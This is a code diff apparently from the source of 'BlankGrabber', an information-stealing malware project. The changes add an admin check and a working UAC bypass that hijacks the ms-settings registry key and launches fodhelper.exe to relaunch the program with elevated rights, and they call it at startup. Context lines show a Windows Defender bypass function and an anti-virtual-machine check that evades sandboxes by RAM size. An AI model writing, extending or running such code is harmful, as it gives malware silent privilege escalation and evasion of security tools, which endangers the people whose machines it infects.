@@ -40,6 +40,20 @@ def bypass_wd():
 def generate(num=5):
     return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
 
+def is_admin():
+    s = subprocess.run("net session", shell= True, capture_output= True).returncode
+    if s == 0:
+        return True
+    else:
+        return False
+
+def uac_bypass():
+    subprocess.run(rf'reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "{os.path.abspath(sys.executable)}" /f', shell= True, capture_output= True)
+    subprocess.run(rf'reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f', shell= True, capture_output= True)
+    subprocess.run('fodhelper.exe', shell= True, capture_output= True)
+    subprocess.run(rf'reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1', shell= True, capture_output= True)
+    fquit()
+
 class vmprotect:
     def __init__(self):
         if int(subprocess.run("wmic computersystem get totalphysicalmemory", capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000 < 1.7:
@@ -363,6 +377,8 @@ class BlankGrabber:
 
 if __name__ == "__main__":
     time.sleep(1)
+    if not is_admin():
+        uac_bypass()
     while True:
         try:
             r = requests.get("https://httpbin.org/get?1=2")
